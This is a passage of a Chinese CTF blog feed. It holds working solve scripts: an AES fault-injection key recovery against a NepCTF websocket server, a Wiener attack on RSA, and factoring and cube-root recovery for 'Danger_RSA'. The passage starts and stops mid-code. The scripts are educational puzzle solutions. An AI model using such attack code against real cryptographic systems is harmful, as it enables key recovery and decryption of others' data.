class="hljs-number">0xEF</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>]<br>rcon = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x36</span>]<br>mix_column_matrix   = [<span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>] <span class="hljs-comment"># 列混合乘的矩阵</span><br>i_mix_column_matrix = [<span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>] <span class="hljs-comment"># 列混合乘的逆矩阵</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, key</span>): <span class="hljs-comment">#a和key都是列表，都存了16字节</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[i], <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(key[i], <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hex</span>(<span class="hljs-params">s</span>): <span class="hljs-comment">#得到一个字符串的十六进制值，以列表形式返回</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shiftrows</span>(<span class="hljs-params">a, inverse=<span class="hljs-literal">False</span></span>): <span class="hljs-comment">#inverse为True时表示为逆操作，默认为False</span><br>    <span class="hljs-keyword">return</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">3</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">11</span>] ] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">11</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">3</span>] ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mixcolumn</span>(<span class="hljs-params">m_row, inverse=<span class="hljs-literal">False</span></span>):<br>    matrix = mix_column_matrix <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_mix_column_matrix<br>    m_col = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        x, y = i % <span class="hljs-number">4</span>, i // <span class="hljs-number">4</span> <br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            result ^= (mul(matrix[x * <span class="hljs-number">4</span> + j], <span class="hljs-built_in">int</span>(m_row[y * <span class="hljs-number">4</span> + j], <span class="hljs-number">16</span>)))<br>        result = mod(result)<br>        m_col.append(<span class="hljs-built_in">hex</span>(result))<br>    <span class="hljs-keyword">return</span> m_col<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_zero_rotate</span>():<br>    key_rotate = [[<span class="hljs-string">&#x27;0x00&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>)]<br>    <span class="hljs-keyword">return</span> key_rotate<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">c, key_rotate</span>):<br>    c_hex = [<span class="hljs-string">&#x27;0x&#x27;</span> + c[i * <span class="hljs-number">2</span>] + c[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)] <span class="hljs-comment">#将密文恢复为列表</span><br>    c_xor = xor(c_hex, key_rotate[<span class="hljs-number">10</span>])<br>    c_row = shiftrows(c_xor, inverse=<span class="hljs-literal">True</span>)<br>    c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> rotate <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>): <span class="hljs-comment">#循环9次</span><br>        c_xor = xor(c_s, key_rotate[rotate])<br>        c_col = mixcolumn(c_xor, inverse=<span class="hljs-literal">True</span>)<br>        c_row = shiftrows(c_col, inverse=<span class="hljs-literal">True</span>)<br>        c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    plain_bytes = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xor(c_s, key_rotate[<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">return</span> plain_bytes.<span class="hljs-built_in">hex</span>() <br></code></pre></td></tr></table></figure><p>破解脚本<code>ans.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> websocket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> aes<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>url = <span class="hljs-string">&quot;wss://www.nepctf.com/api/traffic/Cb0Tcf4XIXmHG8dG1tqVI?port=9999&quot;</span><br>ws = websocket.create_connection(url, sslopt=&#123;<span class="hljs-string">&quot;cert_reqs&quot;</span>: ssl.CERT_NONE&#125;)<br><br>prompt = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server says:&quot;</span>, prompt.decode())<br><br>plaintext = <span class="hljs-string">&quot;00112233445566778899aabbccddeeff&quot;</span><br>ws.send(plaintext+<span class="hljs-string">&quot;\n&quot;</span>)<br>msg = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg=&quot;</span>,msg)<br>ws.send(<span class="hljs-string">&quot;90\n&quot;</span>)<br><br>shock = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg1=&quot;</span>,shock.decode())<br>msg2 = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg2=&quot;</span>,msg2)<br>msg3 = ws.recv().decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg3=&quot;</span>,msg3)<br>cipher = re.search(<span class="hljs-string">r&#x27;([0-9a-fA-F]&#123;32&#125;)&#x27;</span>, msg3).group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cipher=&quot;</span>,cipher)<br><br><span class="hljs-comment">#使用纯0轮密钥解密</span><br>rotate_key = aes.key_zero_rotate()<br>plain = aes.aes_decrypt(cipher,rotate_key)<br><br>key = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(plaintext,<span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(plain,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;key=&quot;</span>,key)<br>ws.send(key+<span class="hljs-string">&quot;\n&quot;</span>)<br>msg4 = ws.recv().decode()<br><span class="hljs-built_in">print</span>(msg4)<br><br>ws.close()<br></code></pre></td></tr></table></figure><p>运行获取<code>FLAG</code>，提示一下，由于我们的故障注入并不能保证比特翻转后的<code>i</code>一定大于44，因此需要多尝试几次才能获得flag。<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250808015443760.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯 2023 Wp（复现）</title>
    <link href="/2025/07/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <url>/2025/07/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>NSS刷题复现笔记，过程写的可能比较简单，有问题欢迎指出交流(・∀・)つ⑩</p><h1 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> md5 <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> p, q<br><br>e = ?????<br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>ans = gcd(e,phi)<br><br><span class="hljs-built_in">print</span> n, e, d<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="hljs-built_in">str</span>(p + q)).hexdigest()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">nspan><br><span class="hljs-string">d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>维纳攻击，把d当作原本的e就行，进行连分数展开便能求解。<br>值得注意的是，本题附件存在问题，n的真实数字在附件中重复了两遍，要手动删去(／‵Д′)／~ ╧╧<br><strong>题解：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wiener</span>(<span class="hljs-params">N:<span class="hljs-built_in">int</span>, d:<span class="hljs-built_in">int</span>, debug = <span class="hljs-literal">True</span></span>):<br>    N = Integer(N)<br>    d = Integer(d)<br>    cf = (d / N).continued_fraction().convergents()<br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> cf:<br>        k = f.numer()<br>        e = f.denom()<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi_N = <span class="hljs-built_in">int</span>(ceil((e * d / k) - <span class="hljs-number">1</span>))<br>        b = -(N - phi_N + <span class="hljs-number">1</span>)<br>        delta = b ^ <span class="hljs-number">2</span> - <span class="hljs-number">4</span> * N<br>        <span class="hljs-keyword">if</span> delta &gt;= <span class="hljs-number">0</span>:<br>            delta_sqrt = sqrt(delta)<br>            p = (-b + delta_sqrt) / <span class="hljs-number">2</span><br>            q = (-b - delta_sqrt) / <span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> p.is_integer() <span class="hljs-keyword">and</span> q.is_integer() <span class="hljs-keyword">and</span> (p * q) % N == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> debug:<br>                    p = <span class="hljs-built_in">int</span>(p % N)<br>                    q = <span class="hljs-built_in">int</span>(q % N)<br>                    <span class="hljs-keyword">return</span> p, q<br>n = <span class="hljs-number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span><br>d = <span class="hljs-number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span><br><br>p,q = wiener(n,d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest())<br></code></pre></td></tr></table></figure><h1 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">a, nbit</span>):<br>    <span class="hljs-keyword">assert</span> a &gt;= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        X = getRandomInteger(nbit // a)<br>        s = getRandomRange(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, a ** <span class="hljs-number">2</span> - a + <span class="hljs-number">4</span>), <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, a ** <span class="hljs-number">2</span> - a + <span class="hljs-number">5</span>))<br>        p = X ** a + s<br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            <span class="hljs-keyword">return</span> (p, s)<br><br><br>p, s = get_key(a, <span class="hljs-number">1024</span>)<br>q, t = get_key(a, <span class="hljs-number">1024</span>)<br><br>N = p * q<br>e = s * t<br>c = <span class="hljs-built_in">pow</span>(m, e, N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;N =&quot;</span>, N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><span class="hljs-comment"># N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span><br><span class="hljs-comment"># e = 11079917583</span><br><span class="hljs-comment"># c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>已知<code>X = getRandomInteger(nbit // a)</code>，则有$2\leq a \leq 1024$<br>已知<code>s = getRandomRange(pow(2, a ** 2 - a + 4), pow(2, a ** 2 - a + 5))</code>，则有$2^{a^2-a+4}\leq s \leq 2^{a^2-a+5}$<br>同时e分解可以得到$e &#x3D; 3\cdot 7 \cdot 7 \cdot 19 \cdot 691 \cdot 5741，且2^{33}\leq e \leq 2^{34}$<br>尝试不同的a的值：</p><ul><li>a&#x3D;2时，$2^4\leq s \leq 2^5$</li><li>a&#x3D;3时，$2^{10} \leq s \leq 2^{11}$</li><li>a&#x3D;4时，$2^{16}\leq s \leq 2^{17}$<br>结合e的取值范围，可以得到$a&#x3D;4$<br>之后对e的因子进行排列组合拆成两组，可以发现有两种组合</li><li>$s &#x3D; 5741\cdot 19,t&#x3D;691\cdot 3 \cdot 7 \cdot 7$</li><li>$s&#x3D;5741\cdot 3 \cdot 7,t&#x3D;691\cdot 7 \cdot 19$<br>$\therefore N&#x3D;(X_1^4+s)(X_2^4+t)$<br>$\because X_1^4X_2^4 &gt;&gt; tX_1^4+sX_2^4+st$<br>$\therefore gmpy2.iroot(N,4)[0] &#x3D; X_1X_2$<br>$\therefore$两个未知数两个方程，列方程组求解即可得到$p,q$<br>但是后续求解出$p,q$后会发现$e$和$phi$不互素，后来尝试后发现$3|(p-1),7|(q-1)$，由于明文的比特一般不会大于$p$的1024比特，因此尝试在模$p$下求解，将$m^3$当作整体，求$d&#x3D;invert(e&#x2F;&#x2F;3,p-1)$，最后求出$m^3$再在模$p$下求根即可。<br><strong>解答：</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, Eq, solve<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> totient<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span><br>e = <span class="hljs-number">11079917583</span><br>c = <span class="hljs-number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span><br><br>x, y = symbols(<span class="hljs-string">&#x27;x y&#x27;</span>, real=<span class="hljs-literal">True</span>, positive=<span class="hljs-literal">True</span>)<br>S = [<span class="hljs-number">5741</span>*<span class="hljs-number">19</span>,<span class="hljs-number">5741</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7</span>]<br>T = [<span class="hljs-number">691</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7</span>*<span class="hljs-number">7</span>,<span class="hljs-number">691</span>*<span class="hljs-number">19</span>*<span class="hljs-number">7</span>]<br><span class="hljs-keyword">for</span> s,t <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(S,T):<br>    <span class="hljs-comment">#print(s*t)</span><br>    eq1 = Eq((x**<span class="hljs-number">4</span>+s)*(y**<span class="hljs-number">4</span>+t), N)<br>    eq2 = Eq(x*y,gmpy2.iroot(N,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>])<br><br>    sol = solve((eq1, eq2), (x, y))<br>    <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> sol:<br>        a = <span class="hljs-built_in">int</span>(root[<span class="hljs-number">0</span>])<br>        b = <span class="hljs-built_in">int</span>(root[<span class="hljs-number">1</span>])<br>        p = <span class="hljs-built_in">int</span>(a**<span class="hljs-number">4</span>+s)<br>        q = <span class="hljs-built_in">int</span>(b**<span class="hljs-number">4</span>+t)<br>        <span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> b &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> p*q == N:<br>            <span class="hljs-comment">#print(sol)</span><br>            <span class="hljs-comment">#print(s,t)</span><br>            <span class="hljs-comment">#print(p,q)</span><br>            <span class="hljs-comment">#转为在模p下求解</span><br>            phi = p-<span class="hljs-number">1</span><br>            g = gmpy2.gcd(e,phi)<br>            t = e//g<br>            d = gmpy2.invert(t,phi)<br>            <span class="hljs-comment">#print(g)</span><br>            m3 = <span class="hljs-built_in">pow</span>(c,d,p)<br>            P.&lt;m&gt; = PolynomialRing(Zmod(p))<br>            f = m^<span class="hljs-number">3</span> - m3<br>            roots = f.roots()<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> roots:<br>                m_can = <span class="hljs-built_in">int</span>(r[<span class="hljs-number">0</span>])<br>                ans = long_to_bytes(m_can)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;CTF&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>                    <span class="hljs-built_in">print</span>(ans)<br>                    exit()<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="Easy-3L"><a href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>():<br>    p = getPrime(<span class="hljs-number">1400</span>)<br>    f = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        q = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> gcd(f, q) != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    h = (invert(f, p) * q) % p<br>    <span class="hljs-keyword">return</span> p, h<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt1</span>(<span class="hljs-params">m</span>):<br>    a = getPrime(<span class="hljs-number">250</span>)<br>    b = 